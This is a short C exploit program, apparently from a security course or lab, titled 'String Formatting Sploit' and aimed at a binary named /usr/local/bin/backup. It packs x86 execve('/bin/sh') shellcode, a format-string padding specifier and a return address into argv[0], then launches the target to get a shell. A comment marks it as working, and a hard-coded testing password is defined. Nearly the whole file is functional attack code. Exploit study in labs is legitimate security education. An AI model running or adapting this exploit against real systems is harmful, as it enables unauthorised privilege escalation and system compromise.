/*
 * String Formatting Sploit
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define TARGET "/usr/local/bin/backup"
#define TESTING_PASSWORD "xf35+"

// WORKING
int main(void)
{
  char *args[6];
  char *env[1];

  // BA is third word after spaces (I believe is 8 characters)
  args[0] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh%51d\x8e\xdf\xbf\xff";
  args[1] = "These";
  args[2] = "do";
  args[3] = "not";
  args[4] = "matter"; // I just need argc > 4

  args[5] = NULL;
  env[0] = NULL;
  fprintf(stdout, args[0]);
  if (execve(TARGET, args, env) < 0)
    fprintf(stderr, "execve failed.\n");
  exit(0);
}
